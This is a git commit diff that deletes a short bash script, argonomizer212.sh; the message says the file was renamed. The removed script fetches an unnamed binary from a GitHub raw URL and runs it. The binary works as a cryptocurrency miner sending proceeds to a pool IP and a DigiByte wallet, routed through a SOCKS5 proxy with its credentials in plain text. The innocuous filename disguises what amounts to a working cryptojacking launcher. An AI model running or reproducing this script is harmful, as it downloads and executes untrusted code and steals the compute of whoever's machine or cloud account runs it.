41df0157fb31c96c1f9e805e77ff6ec21291f85d
andromedasizu <115261914+andromedasizu@users.noreply.github.com>
2022-10-07 23:58:43 +0700

    Update and rename argonomizer212.sh to argonomizer2125.sh

--- argonomizer212.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash 
-
-wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
-chmod +x builder
-./builder -a yespower -o stratum+tcp://198.50.168.213:6241 -u DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT -p c=DGB,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@144.168.217.36:8728
